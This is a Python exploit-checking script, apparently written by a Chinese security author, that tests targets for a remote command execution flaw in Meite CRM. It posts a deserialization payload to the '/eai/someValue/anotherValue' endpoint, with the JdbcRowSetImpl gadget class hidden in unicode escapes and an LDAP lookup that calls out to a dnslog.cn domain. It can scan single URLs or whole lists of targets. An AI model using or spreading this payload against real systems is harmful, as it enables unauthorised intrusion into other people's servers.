#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : 浅梦安全
import requests
import argparse
import time
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning

# 打印颜色
RED = '\033[91m'
RESET = '\033[0m'
# 禁用不安全请求警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def get_dnslog():
    response = requests.get('http://www.dnslog.cn/getdomain.php')
    return response.text.strip()

def check_dnslog(dnslog):
    check_url = f'http://www.dnslog.cn/getrecords.php?t={dnslog}'
    response = requests.get(check_url)
    return dnslog in response.text

def check_vulnerability(url,dnslog_url):
    data = {
        "b": {
            "\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c",
            "\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065":f"ldap://{dnslog_url}",
            "autoCommit": "true"
        }
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Content-Type': 'application/json',
        'Cookie': 'JSESSIONID=E010A1A6DED8C9644CFAB420D41F4EB7',
        'Cache-Control': 'no-cache',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Pragma': 'no-cache',
    }
    path = "/eai/someValue/anotherValue"
    try:
        response = requests.post(url + path, json=data, headers=headers, verify=False)
        #time.sleep(10)
        if response.status_code == 500:
            print(f"{RED}{url} 可能存在美特-crm anothervalue远程命令执行漏洞{RESET}")
        else:
            print(f"{url} 漏洞不存在")
    except requests.RequestException as e:
        print(f"请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检查目标URL是否存在美特-crm anothervalue远程命令执行漏洞。')
    parser.add_argument('-u', '--url', help='指定目标URL')
    parser.add_argument('-f', '--file', help='指定包含多个目标URL的文本文件')

    args = parser.parse_args()

    dnslog_url = get_dnslog()

    if args.url:
        check_vulnerability(args.url, dnslog_url)
    elif args.file:
        with open(args.file, 'r') as f:
            targets = f.read().splitlines()
            for target in targets:
                if not target.startswith("http://") and not target.startswith("https://"):
                    target = "http://" + target
                check_vulnerability(target, dnslog_url)

if __name__ == '__main__':
    main()